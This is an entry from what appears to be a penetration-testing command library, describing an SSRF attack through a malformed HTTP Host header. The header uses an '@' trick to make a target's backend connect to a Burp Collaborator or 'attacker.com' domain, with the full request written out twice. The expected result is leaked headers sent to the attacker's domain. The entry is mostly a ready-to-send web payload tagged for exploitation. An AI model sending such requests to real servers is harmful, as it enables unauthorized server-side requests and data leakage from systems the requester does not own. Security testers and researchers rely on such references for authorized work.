---
data: |-
  GET / HTTP/1.1
  Host: www.█████████:80@██████████.burpcollaborator.net
  Pragma: no-cache
  Cache-Control: no-cache, no-transform
  Connection: close
tags:
  - ssrf
  - exploitation
type: command
output: 'Target server connects to burpcollaborator.net, no direct response to attacker'
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:53:38.010Z'
id: f11a324e-bce2-4d62-8537-724f850b6c7a
verified: false
validated: true
submitted: true
---
# ssrf-host-header-get

## Command

```http
GET / HTTP/1.1
Host: www.█████████:80@██████████.burpcollaborator.net
Pragma: no-cache
Cache-Control: no-cache, no-transform
Connection: close
```

## Description

Exploits SSRF by modifying the Host header to redirect backend connections to an attacker-controlled domain.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Host | Malformed header with @ delimiter (e.g., original:port@attacker.net) | Yes |

## Examples

### Basic Usage

```http
GET / HTTP/1.1
Host: www.example.com:80@attacker.com
```

### Advanced Usage

Add Pragma and Cache-Control to avoid caching issues.

## Expected Output

Indirect: Connection to attacker domain with leaked headers; possible 400/500 response from target.

## Related

- [[commands/normal-http-get-to-target]]
